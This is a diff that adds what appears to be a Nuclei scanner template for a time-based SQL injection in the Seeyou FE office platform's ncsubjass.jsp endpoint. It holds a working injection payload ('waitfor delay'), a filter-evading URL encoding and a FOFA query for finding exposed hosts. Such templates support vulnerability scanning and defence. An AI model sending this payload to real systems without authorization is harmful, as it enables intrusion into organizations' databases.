@@ -1,0 +1,31 @@
+id: Seeyou-FE-ncsubjass-sqli
+
+info:
+  name: 致远互联FE协作办公平台 ncsubjass SQL注入
+  author: god
+  severity: high
+  description: 致远互联FE协作办公平台 ncsubjass SQL注入
+  metadata:
+    fofa-query: body="li_plugins_download"
+  tags: seeyou,sqli
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /fenc/ncsubjass.j%73p HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 36
+
+    subjcode=-1';waitfor delay '0:0:3'--
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+          - type: dsl
+            dsl:
+              - 'duration>=3 && duration<5' 
+              - 'status_code_1 == 200'
+            condition: and
